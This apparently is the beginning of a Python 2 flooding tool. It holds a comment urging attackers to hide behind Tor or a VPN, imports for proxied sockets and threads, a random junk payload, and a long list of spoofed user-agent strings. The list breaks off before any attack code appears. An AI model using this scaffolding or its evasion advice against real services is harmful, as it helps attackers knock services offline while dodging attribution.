#Always use anonymizing software Advor/Tor proxy or CyberGhost VPN
import time
import threading
import socket
import random
import socks
import string
import re
import os
from threading import Thread
import sys
import math
import getopt
import urllib2

global term
global stop_now

stop_now = False

randomint=random.randint(1,32250)
randomint2=randomint*random.randint(1,3)
randomletter=random.choice(string.letters)
magicoutput=randomletter*randomint2

useragents = [
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20081005220218 Gecko/2008052201 Fennec/0.9pre",
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1b1pre) Gecko/20080923171103 Fennec/0.8",
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a2pre) Gecko/20080820121708 Fennec/0.7",
"Mozilla/5.0 (X11; U; Linux armv6l; en-US; rv:1.9.1a1pre) Gecko/2008071707 Fennec/0.5",
"Mozilla/5.0 (Windows; U; Windows CE 5.2; en-US; rv:1.9.2a1pre) Gecko/20090210 Fennec/0.11",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16",
"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) ",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) ",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) ",
"Mozilla/5.0 (X11; U; Linux i686; tr-TR; rv:1.9.2.12) Gecko/20101028 Pardus/2009 Firefox/3.6.12",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2",
"Mozilla/5.0 (Linux; U; Android 4.1.2; en-au; GT-I9305T Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2; my-mm; GT-M6a Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.4.2; ASUS_T00F Build/KVT49L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.141 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; I9192 Build/MocorDroid2.3.5) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; Android 4.2.2; GT-P5100 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.3; SM-G7102 Build/JLS36C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.136 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.2.2; Galaxy S4 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.2; en-us; SM-N900A Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile",
"Mozilla/5.0 (Linux; Android 4.4.4; XT1097 Build/KXE21.187-30.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile",
"Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Lenovo A369i Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.3; D2305 Build/18.0.A.1.30) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.4.2; en-gb; LG-D802 Build/KOT49I.D80220c) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.2.2; vi-vn; mobiistar touch BEAN 402c Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.4.4; en-us; XT1080 Build/SU4.21) AppleWebKit/537.16 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.16",
"Mozilla/5.0 (Linux; U; Android 4.3; en-ca; HUAWEI G6-L11 Build/HuaweiG6-L11) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; Android 4.1.2; LG-F160L Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; SonyC1505 Build/11.3.A.2.23) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.2.2; th-th; HUAWEI Y511-U30 Build/HUAWEIY511-U30) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Series40; Nokia2700c/09.98; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.5.0.0.27",
"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
"Mozilla/5.0 (X11; Linux i686; rv:6.0.2) (Q7sip7ZS4Ba8FkDSOvRNleYM4KEG59V8+uT/RC1tW0U=) Gecko/20100101 Firefox/6.0.2",
"Mozilla/5.0 (Windows NT 6.2; ARM; Trident/7.0; Touch; rv:11.0; WPDesktop; NOKIA; Lumia 925; ANZ892) like Gecko",
"Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 925; ANZ892) like Gecko",
"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; ; CJPMS_AAPCA4157828C9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.17 (KHTML, like Gecko) Chrome/24.0.1312.14 Safari/537.17",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2194.2 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0 FirePHP/0.7.4",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.742.100 Safari/534.30",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
"Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/38.0.2125.59 Mobile/12A365 Safari/600.1.4",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.99 Safari/537.22",
"Mozilla/5.0 (iPod touch; CPU iPhone OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B411 Safari/600.1.4",
"Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.7 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36 OPR/25.0.1614.50",
"Mozilla/5.0 (X11; CrOS x86_64 6158.64.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.108 Safari/537.36",
"Mozilla/5.0 (Linux ia32) node.js/0.10.32 v8/3.14.5.9",
"Mozilla/5.0 (compatible; Googlebot/4.1; en-US rv:9.3.7) Firefox/32.5",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7)",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_0) ",
"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0;  http://www.beslist.nl/)",
"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable)",
"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable)",
"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2)",
"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3)",
"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2)",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13)",
"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0)",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8)",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201Firefox/2.0.0.12",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7) ",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) ",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:5.0.1) ",
"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7",
"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.1.0.346 Mobile Safari/534.11+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9850; en) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.254 Mobile Safari/534.11+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; zh-TW) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; zh-TW) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; tr) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; it) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.668 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; fr) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.246 Mobile Safari/534.1+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.701 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.466 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.450 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.201 Mobile Safari/534.1+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-US) AppleWebKit/534.1+ (KHTML, like Gecko)",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en-GB) AppleWebKit/534.1+ (KHTML, like Gecko) Version/6.0.0.337 Mobile Safari/534.1+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9800; en) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.448 Mobile Safari/534.8+",
"Mozilla/5.0 (BlackBerry; U; BlackBerry 9700; pt) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.546 Mobile Safari/534.8+",
"Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",
"Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari",
"Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile",
"Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; BOLT/2.340) AppleWebKit/530+ (KHTML, like Gecko) Version/4.0 Safari/530.17 UNTRUSTED/1.0 3gpp-gba",
"Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaC6-00/20.0.042; Profile/MIDP-2.1 Configuration/CLDC-1.1; zh-hk) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.2.6.9 3gpp-gba",
"Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba",
"Mozilla/5.0 (Windows; U; Windows CE; Mobile; like iPhone; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3 Dorothy",
"Mozilla/5.0 (Windows; U; Windows CE; Mobile; like Android; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3 Dorothy",
"Mozilla/5.0 (Windows; U; Mobile; Dorothy Browser; en-US) AppleWebKit/533.3 (KHTML, like Gecko) Version/3.1.2 Mobile Safari/533.3",
"Mozilla/5.0 (Windows; U; Dorothy Browser; ko-kr) AppleWebKit/533.3 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.3",
"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:7.0a1) Gecko/20110623 Firefox/7.0a1 Fennec/7.0a1",
"Mozilla/5.0 (Maemo; Linux armv7l; rv:6.0a1) Gecko/20110526 Firefox/6.0a1 Fennec/6.0a1",
"Mozilla/5.0 (Maemo; Linux armv7l; rv:6.0a1) Gecko/20110522 Firefox/6.0a1 Fennec/6.0a1",
"Mozilla/5.0 (Maemo; Linux armv7l; rv:6.0a1) Gecko/20110518 Firefox/6.0a1 Fennec/6.0a1",
"Mozilla/5.0 (Maemo; Linux armv7l; rv:6.0a1) Gecko/20110510 Firefox/6.0a1 Fennec/6.0a1",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; fr; rv:1.9.2.18) Gecko/20110614",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24",
"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25",
"Mozilla/5.0 (Windows NT 5.2; RW; rv:7.0a1) Gecko/20091211 SeaMonkey/9.23a1pre",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; ja-jp) AppleWebKit/419 (KHTML, like Gecko) Shiira/1.2.3 Safari/125",
"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.1b5pre) Gecko/20090519 Shiretoko/3.5b5pre",
"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_6; en-us) AppleWebKit/528.16 (KHTML, like Gecko) Stainless/0.5.3 Safari/525.20.1"
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.9) Gecko/20071110 Sylera/3.0.20 SeaMonkey/1.1.6",
"Mozilla/5.0 (Macintosh; PPC Mac OS X 10.5; rv:10.0.2) Gecko/20120216 Firefox/10.0.2 TenFourFox/7450",
"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; TheWorld)"
"Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR) AppleWebKit/534.12 (KHTML, like Gecko) WeltweitimnetzBrowser/0.25 Safari/534.12",
"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20100121 Firefox/3.5.6 Wyzo/3.5.6.1",
"Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",
"Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari",
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile",
"Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
